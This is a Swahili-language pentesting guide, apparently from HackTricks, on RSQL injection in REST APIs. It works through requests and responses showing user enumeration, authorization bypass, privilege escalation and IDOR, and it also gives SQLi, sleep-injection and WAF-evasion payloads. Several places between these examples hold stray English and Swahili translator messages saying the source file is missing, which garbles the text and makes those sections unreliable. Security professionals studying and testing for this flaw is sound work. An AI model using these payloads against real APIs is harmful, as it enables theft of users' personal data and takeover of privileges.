# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## RSQL ni nini?
RSQL ni lugha ya query iliyoundwa kwa ajili ya uchujaji wenye vigezo (parameterized filtering) vya pembejeo katika RESTful APIs. Imegawanywa kutoka FIQL (Feed Item Query Language), iliyoainishwa awali na Mark Nottingham kwa ajili ya kuulizia Atom feeds, RSQL inajivunia unyenyekevu wake na uwezo wa kueleza maswali magumu kwa njia fupi na inayofaa kwa URI juu ya HTTP. Hii inafanya iwe chaguo nzuri kama lugha ya ujumla ya query kwa kutafuta kwenye REST endpoint.

## Muhtasari
RSQL Injection ni udhaifu katika maombi ya wavuti yanayotumia RSQL kama lugha ya query katika RESTful APIs. Kama SQL Injection na LDAP Injection, udhaifu huu hutokea wakati filter za RSQL hazifanywi sanitize ipasavyo, kumbu kumbuzo hivyo kumuwezesha mshambuliaji kuingiza queries zenye madhara ili kufikia, kubadilisha au kufuta data bila idhini.

## Inafanya kazi vipi?
RSQL inakuwezesha kujenga maswali ya juu katika RESTful APIs, kwa mfano:
```bash
/products?filter=price>100;category==electronics
```
Hii inatafsiriwa kuwa query iliyopangwa ambayo inachuja bidhaa zenye bei zaidi ya 100 na kategoria “elektroniki”.

Ikiwa programu haitathibitisha ingizo la mtumiaji ipasavyo, mshambuliaji anaweza kubadilisha filter ili kuendesha query zisizotarajiwa, kama:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
Au hata kuchukua fursa kutoa taarifa nyeti kwa kutumia maswali ya Boolean au subqueries zilizowekwa ndani.

## Hatari
- **Ufunuo wa data nyeti:** Mshambuliaji anaweza kupata taarifa ambazo hazipaswi kupatikana.
- **Ubadilishaji au ufutaji wa data:** Uingiza filters ambazo zinabadilisha rekodi za database.
- **Kuongezeka kwa ruhusa:** Ubadilishaji wa vitambulisho vinavyotoa roles kupitia filters ili kudanganya application kwa kupata ruhusa za watumiaji wengine.
- **Kukwepa udhibiti wa upatikanaji:** Ubadilishaji wa filters kupata data zilizozuiliwa.
- **Utangazaji au IDOR:** Mabadiliko ya vitambulisho kati ya watumiaji kupitia filters ambazo zinaruhusu kupata taarifa na rasilimali za watumiaji wengine bila kuthibitishwa ipasavyo.

## Operators za RSQL zinazoungwa mkono
| Operator  | Maelezo | Mfano  |
|:----: |:----: |:------------------:|
| `;` / `and` | Operator ya mantiki **AND**. Huchuja rekodi ambapo *vigezo vyote viwili* ni *true* | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | Operator ya mantiki **OR**. Huchuja rekodi ambapo *angalau moja* ya vigezo ni *true*| `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | Hufanya query ya **equals**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* zinafanana kabisa na *queryValue* | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | Hufanya query ya **search**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* zina majiunga na *queryValue* | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | Hufanya query ya **like**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* zinafanana na muundo wa *queryValue* | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | Hufanya query ya **in**. Inarudisha rekodi zote kutoka *myTable* ambapo *columnA* ina *valueA* AU *valueB* | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | Hufanya query ya **exclude**. Inarudisha rekodi zote za *myTable* ambapo thamani katika *columnA* sio *valueA* wala *valueB* | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | Hufanya query ya *not equals*. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* hazifanani na *queryValue* | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | Hufanya query ya **not like**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* hazifanani na *queryValue* | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | Hufanya query ya **lesser than**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* ni ndogo kuliko *queryValue* | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | Hufanya query ya **lesser than** au **equal to**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* ni ndogo au sawa na *queryValue* | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | Hufanya query ya **greater than**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* ni kubwa kuliko *queryValue* | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | Hufanya query ya **equal** au **greater than**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* ni sawa au kubwa kuliko *queryValue* | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | Hufanya query ya **from to**. Inarudisha rekodi zote kutoka *myTable* ambapo thamani katika *columnA* ni sawa au kubwa kuliko *fromValue*, na ndogo au sawa na *toValue* | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Kumbuka**: Jedwali lilitokana na taarifa kutoka kwa [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) na [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.

#### Mifano
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Kumbuka**: Jedwali lilitokana na taarifa kutoka kwa [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.

## Vichujio vya kawaida
Vichujio hivi husaidia kuboresha maswali (queries) katika APIs:

| Filter | Maelezo | Mfano |
|--------|------------|---------|
| `filter[users]` | Huchuja matokeo kwa watumiaji maalum | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | Huchuja kwa status (active/inactive, completed, n.k.) | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | Huchuja matokeo ndani ya kipindi cha tarehe | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | Huchuja kwa kategoria au aina ya rasilimali | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | Huchuja kwa kitambulisho cha kipekee | `/api/v2/posts?filter[id]=42` |

## Vigezo vya kawaida
Vigezo hivi husaidia kuboresha majibu ya API:

| Kigezo | Maelezo | Mfano |
|-----------|------------|---------|
| `include` | Inajumuisha rasilimali zinazohusiana katika jibu | `/api/v2/orders?include=customer,items` |
| `sort` | Inapanga matokeo kwa mpangilio wa ascend/descend | `/api/v2/users?sort=-created_at` |
| `page[size]` | Inadhibiti idadi ya matokeo kwa kila ukurasa | `/api/v2/products?page[size]=10` |
| `page[number]` | Inaelezea nambari ya ukurasa | `/api/v2/products?page[number]=2` |
| `fields[resource]` | Inaeleza ni vipi vinavyorejeshwa katika jibu | `/api/v2/users?fields[users]=id,name,email` |
| `search` | Hufanya utafutaji wenye urefu zaidi wa utafutaji | `/api/v2/posts?search=technology` |

## Information leakage and enumeration of users
The following request shows a registration endpoint that requires the email parameter to check if there is any user registered with that email and return a true or false depending on whether or not it exists in the database:
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the content of src/pentesting-web/rsql-injection.md. Please paste the file content you want translated to Swahili.
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
Ingawa `/api/registrations?email=<emailAccount>` inatarajiwa, inawezekana kutumia RSQL filters kujaribu kuwaorodhesha na/au kutoa taarifa za watumiaji kwa kutumia operators maalum:

### Ombi
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Majibu
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
Katika tukio la kupatana na akaunti halali ya barua pepe, programu itarejesha taarifa za mtumiaji badala ya kawaida *“true”*, *"1"* au chochote katika majibu kwa server:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Jibu
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
Katika tukio hili, tunaanza na mtumiaji mwenye jukumu la msingi ambaye hana ruhusa za juu (kwa mfano administrator) za kufikia orodha ya watumiaji wote waliojisajili kwenye hifadhidata:
### Ombi
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Samahani, ninahitaji yaliyomo ya faili src/pentesting-web/rsql-injection.md ili niweze kutafsiri. Tafadhali nakili na ubandike maudhui ya markdown hapa. Nitatafsiri maandishi ya Kiingereza muhimu kwa Kiswahili na nitaacha code, tags, links na paths bila kubadilisha.
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
Tena tunatumia filters na special operators ambazo zitaturuhusu njia mbadala ya kupata taarifa za users na kuepuka access control.
Kwa mfano, filter kwa *users* ambao wana herufi “*a*” katika user *ID*:
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Sijaona maudhui ya faili. Tafadhali bandika hapa yaliyomo ya src/pentesting-web/rsql-injection.md ili niweze kutafsiri kwa Kiswahili.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
Inawezekana sana kupata certain endpoints zinazokagua user privileges kupitia role yao. Kwa mfano, tunashughulika na user ambaye hana privileges:
### Request
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Majibu
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
Kwa kutumia operators fulani tungeweza kuorodhesha watumiaji wa msimamizi:
### Ombi
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Majibu
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
Baada ya kujua identifier ya mtumiaji administrator, itakuwa inawezekana ku-exploit privilege escalation kwa kubadilisha au kuongeza filter inayofanana na identifier ya administrator na kupata privileges sawa:
### Ombi
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the contents of src/pentesting-web/rsql-injection.md. Please paste the markdown you want translated (or confirm you want me to translate the whole file and provide its content). I will translate the English text to Swahili while preserving code, tags, links, paths and markdown exactly.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
Mbali na matumizi ya parameter ya `filter`, inawezekana kutumia parameter nyingine kama `include` ambayo inaruhusu kujumuisha katika matokeo vigezo fulani (kwa mfano: lugha, nchi, password...).

Katika mfano ufuatao, taarifa za wasifu la mtumiaji wetu zinaonyeshwa:
### Ombi
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Majibu
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
Mchanganyiko wa chujio unaweza kutumika kuepuka udhibiti wa idhini na kupata ufikiaji wa wasifu za watumiaji wengine:
### Ombi
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Jibu
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## Ugundaji & fuzzing quickwins
- Angalia msaada wa RSQL kwa kutuma majaribio yasiyo hatari kama `?filter=id==test`, `?q==test` au operators zilizo vikosewa `=foo=`; verbose APIs mara nyingi leak parser errors ("Unknown operator" / "Unknown property").
- Matumizi mengi hufanya double-parse ya vigezo vya URL; jaribu double-encoding `(`, `)`, `*`, `;` (mfano `%2528admin%2529`) ili kuepuka blocklists zisizo za kitaalamu na WAFs.
- Boolean exfil with wildcards: `filter[users]=email==*%@example.com;status==ACTIVE` na badilisha mantiki kwa `,` (OR) kulinganisha ukubwa wa majibu.
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` hutoa enumeration kwa haraka kwa mwaka bila kujua IDs halisi.

## Framework-specific abuse (Elide / JPA Specification / JSON:API)
- Elide na miradi mingi ya Spring Data REST hubadilisha RSQL moja kwa moja kuwa JPA Criteria. Wakati developers wanaongeza custom operators (mfano `=ilike=`) na kujenga predicates kwa string concatenation badala ya prepared parameters, unaweza kupindua hadi SQLi (classic payload: `name=ilike='%%' OR 1=1--'`).
- Elide analytic data store inakubali parameterized columns; kuchanganya analytic params zinazosimamiwa na mtumiaji na RSQL filters ilikuwa chanzo cha SQLi katika CVE-2022-24827. Hata kama versions zilizosahihishwa zinatumia parameterization ipasavyo, code za bespoke zinazofanana mara nyingi hubaki—tafuta `@JoinFilter`/`@ReadPermission` SpEL expressions zenye `${}` na jaribu kuingiza `';sleep(5);'` au tautologies za mantiki.
- JSON:API backends mara nyingi hutoa zote `include` na `filter`. Kusefa kwenye resources zinazohusiana `filter[orders]=customer.email==*admin*` inaweza bypass top-level ACLs kwa sababu relation-level filters zinaendeshwa kabla ya ukaguzi wa umiliki.

## Automation helpers
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` inathibitisha payloads locally na inaonyesha abstract syntax tree—inayosaidia kutengeneza parentheses zilizo sawa na custom operators.
- **Python quick builder**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- Tumia pamoja na HTTP fuzzer (ffuf, turbo-intruder) kwa kurudia nafasi za wildcard `*a*`, `*e*`, nk., ndani ya orodha za `=in=` ili kuorodhesha IDs na emails kwa haraka.

## Marejeo
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
